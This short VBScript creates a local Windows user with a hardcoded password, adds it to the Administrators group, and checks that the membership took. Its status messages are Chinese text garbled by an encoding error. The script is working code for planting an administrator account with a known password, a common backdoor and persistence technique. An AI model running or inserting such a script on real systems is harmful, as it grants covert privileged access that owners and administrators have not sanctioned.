'struser=wscript.arguments(0)
'strpass=wscript.arguments(1)

struser="yongfa365sdf"
strpass="yongfa365sdf"

set lp=createObject("WSCRIPT.NETWORK") 
oz="WinNT://"&lp.ComputerName 
Set ob=GetObject(oz) 
Set oe=GetObject(oz&"/Administrators,group") 
Set od=ob.create("user",struser) 
od.SetPassword strpass 
od.SetInfo 
Set of=GetObject(oz&"/" & struser & ",user") 
oe.Add(of.ADsPath) 

For Each admin in oe.Members
if struser=admin.Name then
Wscript.echo struser & " �����ɹ�!"
wscript.quit
end if
Next

Wscript.echo struser & " �û�����ʧ��!"
